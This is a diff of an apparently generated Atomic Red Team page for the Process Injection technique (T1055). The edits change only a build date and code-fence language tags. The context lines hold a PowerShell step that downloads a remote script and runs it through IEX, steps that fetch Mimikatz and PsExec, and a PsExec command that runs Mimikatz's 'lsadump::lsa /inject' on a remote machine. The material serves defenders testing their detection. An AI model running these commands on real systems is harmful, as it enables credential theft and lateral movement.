@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1055"
 attack_technique_name: "Process Injection"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "3203ad24-168e-4bec-be36-f79b13ef8a83"
@@ -68,14 +68,14 @@ Mimikatz executor must exist on disk and at specified location (#{mimikatz_path}
 
 ### Prerequisite Check
 
-```text
+```powershell
 $mimikatz_path = cmd /c echo #{mimikatz_path}
 if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
 $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
@@ -89,13 +89,13 @@ PsExec tool from Sysinternals must exist on disk at specified location (#{psexec
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing
@@ -111,7 +111,7 @@ Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec
 
 ### Command
 
-```commandprompt
+```cmd
 "#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
 ```
 
